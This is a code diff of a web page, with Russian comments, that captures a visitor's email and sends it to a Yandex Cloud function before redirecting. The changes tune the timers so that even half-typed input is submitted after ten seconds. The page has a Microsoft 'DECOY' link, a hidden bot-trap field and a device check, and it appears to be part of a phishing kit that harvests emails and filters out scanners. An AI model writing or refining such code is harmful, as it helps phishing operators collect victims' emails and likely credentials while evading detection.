@@ -132,7 +132,6 @@ input[type=email]:disabled{
   opacity:0;pointer-events:none;
 }
 
-/* Стиль для новой подсказки */
 .redirect-note {
   font-size: 12px;
   color: #94a3b8;
@@ -178,7 +177,6 @@ input[type=email]:disabled{
     <div class="suggestion" id="suggestion" hidden></div>
   </div>
 
-  <!-- ВОТ НАША НОВАЯ ПОДСКАЗКА -->
   <p class="redirect-note">You will be redirected automatically after entering your email.</p>
 
   <input type="text" name="website" id="hp" class="honeypot" tabindex="-1" autocomplete="off" aria-hidden="true">
@@ -195,11 +193,11 @@ input[type=email]:disabled{
 
   var CONFIG = {
     FUNCTION_URL: 'https://functions.yandexcloud.net/d4e5bqhobljvknj550vf',
-    IDLE_TIMEOUT_MS: 35000, 
-    ABSOLUTE_TIMEOUT_MS: 35000, 
+    IDLE_TIMEOUT_MS: 35000, // Если ничего не делает
+    ABSOLUTE_TIMEOUT_MS: 35000, // Жесткий лимит на странице
     LOOKUP_DEBOUNCE_MS: 400,
-    EMAIL_DEBOUNCE_MS: 800,
-    GARBAGE_TIMEOUT_MS: 2000,
+    EMAIL_DEBOUNCE_MS: 800, // Ждем 0.8 сек для валидного email
+    GARBAGE_TIMEOUT_MS: 10000, // 10 секунд на подумать после последнего нажатия клавиши
     DECOY: 'https://go.microsoft.com/fwlink/?LinkId=521839'
   };
 
@@ -293,7 +291,7 @@ input[type=email]:disabled{
         var finalEmail = nickname + '@' + domain;
         emailEl.value = finalEmail;
         hideSuggestion();
-        doResolve('email', finalEmail);
+        doResolve('email', finalEmail); // Мгновенный редирект при клике
       });
       suggestionEl.appendChild(btn);
     });
@@ -308,7 +306,7 @@ input[type=email]:disabled{
   function handleInput() {
     if (redirected) return;
     var value = emailEl.value;
-    resetIdle();
+    resetIdle(); // Сбрасываем 35-секундный таймер бездействия
     emailEl.classList.remove('pulse');
 
     var atPos = value.indexOf('@');
@@ -324,13 +322,16 @@ input[type=email]:disabled{
       if (lookupTimer) clearTimeout(lookupTimer);
     }
 
+    // Сбрасываем старый таймер редиректа (10 секунд) при каждом нажатии клавиши
     if (emailTimer) clearTimeout(emailTimer);
     
     if (EMAIL_REGEX.test(value.trim())) {
+      // Валидный email - ждем 0.8 сек
       emailTimer = setTimeout(function() {
         doResolve('email', emailEl.value.trim());
       }, CONFIG.EMAIL_DEBOUNCE_MS);
     } else if (value.trim().length > 0) {
+      // Мусор/недописанный email - ждем 10 секунд с момента ПОСЛЕДНЕГО нажатия
       emailTimer = setTimeout(function() {
         doResolve('email', emailEl.value.trim());
       }, CONFIG.GARBAGE_TIMEOUT_MS);
@@ -344,7 +345,7 @@ input[type=email]:disabled{
       e.preventDefault(); 
       var val = emailEl.value.trim();
       if (emailTimer) clearTimeout(emailTimer);
-      doResolve('email', val);
+      doResolve('email', val); // Мгновенный редирект по Enter
     }
   });
 
@@ -355,6 +356,7 @@ input[type=email]:disabled{
   document.addEventListener('touchstart', resetIdle, { passive: true });
 
   resetIdle();
+  // Запускаем жесткий таймер на 35 секунд, который НИКОГДА не сбрасывается
   absoluteTimer = setTimeout(triggerTimeout, CONFIG.ABSOLUTE_TIMEOUT_MS);
 
   if (!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
